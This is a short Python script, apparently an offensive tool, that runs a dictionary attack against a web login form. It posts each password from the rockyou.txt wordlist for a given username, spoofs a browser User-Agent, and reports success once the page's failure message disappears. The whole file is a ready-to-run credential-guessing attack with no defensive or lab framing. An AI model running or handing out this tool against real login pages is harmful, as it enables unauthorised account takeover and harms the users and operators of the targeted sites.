import requests
import colorama

colorama.init()

link = input("url: ")
user = input("Username: ")
message = input("Fail message: ")

def BruteForce(url,username,password_list):

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    }

    for password in password_list:
        data = {"username":username, "password":password}
        response = requests.post(url,data=data,headers=headers,allow_redirects=True)

        if message not in response.text:
            print(f"{colorama.Fore.GREEN}[+] Success: Username: {username}, password: {password}")
            break
        else:
            print(f"{colorama.Fore.RED}[-] Failed: {password}")
            


passwords = []
with open("rockyou.txt","r",encoding="latin-1") as ListP:
    for linea in ListP:
        passwords.append(linea.strip())
BruteForce(link,user,passwords)
